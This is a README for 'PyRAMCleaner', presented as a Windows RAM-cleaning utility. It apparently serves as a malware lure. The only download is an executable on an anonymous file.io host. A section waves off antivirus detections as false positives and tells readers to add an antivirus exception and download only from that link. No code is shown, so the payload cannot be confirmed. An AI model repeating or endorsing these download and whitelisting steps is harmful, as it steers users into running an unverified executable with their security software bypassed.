# PyRAMCleaner

![PyRAMCleaner Logo](resources/icon.png)

PyRAMCleaner is a powerful, user-friendly RAM optimization tool designed to enhance your system's performance by efficiently managing memory usage.

[![Download PyRAMCleaner](https://img.shields.io/badge/Download-PyRAMCleaner-blue?style=for-the-badge&logo=windows)](https://file.io/il7XdZMta9Ub)

## How It Works

PyRAMCleaner optimizes your system's RAM usage through several methods:

1. **Clearing File System Cache**: It uses Windows API calls to clear unused file system cache, freeing up memory that's no longer actively needed.

2. **Working Set Reduction**: The software reduces the working set of running processes, encouraging the OS to move less-used memory pages to the page file.

3. **DLL Unloading**: It attempts to unload unnecessary DLLs from memory, further reducing RAM usage.

4. **Intelligent Process Management**: PyRAMCleaner analyzes running processes and optimizes memory allocation based on usage patterns and user-defined whitelists.

5. **Automated Cleaning**: It can automatically initiate cleaning when RAM usage exceeds a user-defined threshold.

## Antivirus Concerns

PyRAMCleaner may be flagged by some antivirus software as potentially unwanted. This is a false positive due to the following reasons:

1. **Compilation Method**: The software is compiled using PyInstaller, which packages Python code and dependencies into a single executable. This packaging method is sometimes flagged by antivirus software due to its potential misuse by malware creators.

2. **System-Level Operations**: PyRAMCleaner performs low-level system operations to manage memory, which can trigger antivirus heuristic detection.

3. **Lack of Code Signing**: As an open-source project, the executable is not digitally signed, which can raise flags with some security software.

Rest assured, PyRAMCleaner does not contain any malicious code. If you're concerned, you can run the application in a sandboxed environment.

To use PyRAMCleaner without issues:
1. Add an exception for PyRAMCleaner in your antivirus software.
2. Download the software only from the official link provided above.
3. If you're still concerned, you can run the Python script directly instead of using the compiled executable.
